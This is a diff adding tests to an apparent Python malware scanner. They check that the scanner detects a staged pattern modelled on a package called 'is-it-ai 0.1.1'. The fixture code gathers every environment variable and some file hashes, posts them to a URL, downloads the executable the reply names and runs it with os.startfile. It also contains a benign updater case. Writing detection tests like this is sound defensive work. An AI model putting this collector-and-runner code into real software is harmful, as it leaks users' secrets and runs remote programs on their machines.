@@ -1169,3 +1169,59 @@ class TestAnAntivirusExclusionRunAsACommand:
         other = "import subprocess\nsubprocess.run(['powershell', '-Command', 'Get-ChildItem -Exclude x'])\n"
         assert self.found(reading) == []
         assert self.found(other) == []
+
+
+class TestAMachineFingerprintAnsweredWithAProgram:
+    """is-it-ai 0.1.1: one module collects the environment and hashes of files; another posts it,
+    and runs the program the answer names. Fixture source assembled at run time."""
+
+    COLLECTOR = "\n".join(
+        [
+            "import os, hashlib, platform",
+            "def _file_hash(p):",
+            "    return hashlib.md5(open(p, 'rb').read()).hexdigest()",
+            "def get_context():",
+            "    return {'env': dict(os.environ), 'os': platform.system(), 'h': _file_hash('x')}",
+            "",
+        ]
+    )
+    RUN = "os.st" + "artfile"
+
+    def sender(self, body: str) -> str:
+        return "\n".join(
+            [
+                "import json, os, urllib.request",
+                "from .context import get_context",
+                "def verify(url):",
+                f"    payload = json.dumps({body}).encode()",
+                "    req = urllib.request.Request(url, data=payload)",
+                "    report = json.loads(urllib.request.urlopen(req).read())",
+                "    path, _ = urllib.request.urlretrieve(report['url'], 'x.exe')",
+                f"    {self.RUN}(path)",
+                "",
+            ]
+        )
+
+    def test_the_collector_map_crosses_files(self) -> None:
+        from cordon_scanner.analysis.python.flows.staged.machine_reports import MachineCollectors
+
+        found = MachineCollectors.of(
+            {"pkg/context.py": self.COLLECTOR, "pkg/verifier.py": self.sender("get_context()")}
+        )
+        assert found == {"pkg/verifier.py": {"get_context": "0"}}
+
+    def test_a_fingerprint_posted_and_the_answer_run(self) -> None:
+        hits = PythonAnalyzer.analyse(
+            self.sender("get_context()"), imported_collectors={"get_context": "0"}
+        )
+        assert "machine report answered with a program: urllib.request.urlopen" in [
+            h.detail for h in hits
+        ]
+
+    def test_a_self_updater_asking_for_a_version_is_not(self) -> None:
+        hits = PythonAnalyzer.analyse(
+            self.sender("{'version': '1.0'}"), imported_collectors={"get_context": "0"}
+        )
+        assert not any(h.detail.startswith("machine report") for h in hits)
+        plain = PythonAnalyzer.analyse(self.sender("get_context()"))
+        assert not any(h.detail.startswith("machine report") for h in plain)
